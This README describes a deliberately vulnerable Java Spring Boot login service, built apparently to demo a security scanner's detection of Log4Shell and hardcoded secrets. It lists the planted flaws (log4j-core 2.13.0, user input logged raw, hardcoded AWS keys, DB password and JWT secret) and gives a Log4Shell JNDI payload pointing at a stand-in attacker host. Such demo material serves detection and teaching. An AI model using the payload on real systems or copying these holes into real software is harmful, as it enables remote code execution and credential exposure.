# trendai-demo-java — Spring Boot User Login Service

> **Language:** Java 11 / Spring Boot 2.5 | **Demo Focus:** CVE in Dependency (Log4Shell) + Hardcoded Secrets

A simple employee authentication service for an internal HR portal. Handles login, JWT token issuance, and user search.

---

## What This App Does

This service acts as the authentication backend for a fictional HR self-service portal. Employees submit their credentials, receive a JWT session token, and can search for colleagues by name. It connects to a MySQL database and logs all activity for audit purposes. The app is a realistic Spring Boot REST API — the kind that might exist in any mid-size enterprise.

**Endpoints:**

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/login` | Authenticate with username + password, receive JWT |
| `GET` | `/api/user/search?query=` | Search users by name fragment |
| `GET` | `/api/health` | Service health check |

**Run locally:**

```bash
mvn clean package
java -jar target/trendai-demo-java-1.0.0.jar
# API at http://localhost:8080
```

---

## Intentional Vulnerabilities (SE Reference)

> **For internal SE demo use only.** All vulnerabilities below are introduced intentionally to demonstrate TrendAI Code Security detection capabilities.

| # | Type | Location | CVE / Pattern | Severity |
|---|------|----------|---------------|----------|
| 1 | **Log4Shell — JNDI RCE** | `controller/UserController.java:31,46` — raw user input passed directly to `logger.info()` via log4j-core | CVE-2021-44228 | Critical |
| 2 | **Vulnerable Dependency** | `pom.xml:24` — `log4j-core:2.13.0` pinned below patched version (2.15.0) | CVE-2021-44228, CVE-2021-45046 | Critical |
| 3 | **Hardcoded AWS Access Key** | `src/main/resources/application.properties:10` — `AKIAIOSFODNN7EXAMPLE` | CWE-798 | High |
| 4 | **Hardcoded AWS Secret Key** | `application.properties:11` — `wJalrXUtnFEMI/K7MDENG/...` | CWE-798 | High |
| 5 | **Hardcoded Database Password** | `application.properties:7` — `Tr3ndM1cr0_DB_Pass!EXAMPLE` | CWE-798 | High |
| 6 | **Hardcoded JWT Signing Secret** | `application.properties:15` — `MyS3cr3tJWTSigningKey2023!EXAMPLE` | CWE-321 | High |

---

## Expected TMAS Findings

When TrendAI Code Security scans this project, it should detect:

- **[Critical]** CVE-2021-44228 — Apache Log4j2 JNDI injection (Log4Shell) in `log4j-core:2.13.0`
- **[Critical]** CVE-2021-45046 — incomplete fix follow-on in `log4j-core:2.13.0`
- **[High]** Hardcoded AWS Access Key ID matching `AKIA[A-Z0-9]{16}` pattern in `application.properties`
- **[High]** Hardcoded AWS Secret Access Key in `application.properties`
- **[High]** Hardcoded credential (database password) in `application.properties`
- **[High]** Hardcoded JWT signing secret in `application.properties`

---

## Demo Talking Points

- **"Log4Shell is still alive in enterprise apps."** Log4j 2.13.0 was released in 2020 and is still present in thousands of internal Java services that were never patched. Sending `${jndi:ldap://attacker.com/x}` as the `username` field causes the server to make an outbound LDAP connection — no authentication required.

- **"The secret was committed, so it's already compromised."** Even if the developer later moves the AWS key to an environment variable, the key is permanently visible in git history. TrendAI Code Security catches this at commit time — before it ever reaches the remote.

- **"Most teams don't know which log4j version they're on."** The transitive dependency chain in Maven means developers rarely inspect their logging library directly. SCA scanning surfaces the exact version and maps it to a known CVE automatically.

- **"This is a real pattern from real incident reports."** The Log4Shell vulnerability (December 2021) was exploited within hours of disclosure. Applications with this exact logging pattern — `logger.info("User: " + input)` — were the primary attack vector.

---

## How to Trigger a Scan

1. Push any commit to the `main` branch of this repository
2. GitHub Actions runs `.github/workflows/tmas-scan.yml` automatically
3. The workflow builds the JAR with Maven and submits it to TMAS
4. View findings in **Vision One → Code Security → Scan Results**
5. The pipeline **fails** if any Critical severity finding is detected
